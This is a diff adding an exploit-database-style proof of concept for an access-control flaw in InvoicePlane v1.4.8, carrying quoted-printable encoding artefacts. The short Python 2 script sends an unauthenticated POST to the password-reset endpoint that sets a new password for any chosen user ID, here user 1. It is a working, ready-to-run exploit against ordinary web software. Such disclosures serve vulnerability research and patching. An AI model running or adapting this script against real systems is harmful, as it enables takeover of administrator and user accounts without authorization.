@@ -1,0 +1,27 @@
+# Exploit Title: InvoicePlane v1.4.8 Incorrect Access Control for password =
+reset
+# Date: 12-11-2016
+# Exploit Author: feedersec
+# Contact: feedersec@gmail.com
+# Vendor Homepage: https://invoiceplane.com
+# Software Link: https://invoiceplane.com/download/v1.4.8
+# Version: v1.4.8=20
+# Tested on: ubuntu 16.04 LTS
+
+# Description: An unauthenticated user can POST to=20
+# /index.php/sessions/passwordreset setting a new password for any user
+
+import urllib2, urllib
+
+#set parameters here
+user_id =3D '1'
+new_password =3D 'haxor'
+baseUrl =3D 'http://localhost/'
+####
+
+data =3D urllib.urlencode({'user_id': user_id,=20
+=09=09=09 'new_password' : new_password,
+=09=09=09 'btn_new_password' : '1'})
+
+req =3D urllib2.Request(baseUrl + 'index.php/sessions/passwordreset', data)
+response =3D urllib2.urlopen(req)
